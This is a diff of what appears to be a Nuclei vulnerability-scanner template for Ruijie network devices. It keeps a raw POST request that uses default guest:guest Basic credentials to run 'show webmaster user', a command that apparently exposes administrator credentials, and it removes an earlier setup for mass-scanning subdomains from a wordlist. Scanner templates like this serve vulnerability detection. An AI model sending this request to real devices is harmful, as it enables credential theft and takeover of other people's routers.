@@ -10,22 +10,14 @@ info:
   tags: ruijie,exposure
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
-
-    raw:
+  - raw:
       - |
         POST /WEB_VMS/LEVEL15/ HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Accept-Encoding: gzip, deflate
-        Content-Type: application/x-www-form-urlencoded
-        Content-Length: 80
+        Host: {{Hostname}}
         Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
 
         command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
+
     matchers-condition: and
     matchers:
       - type: word
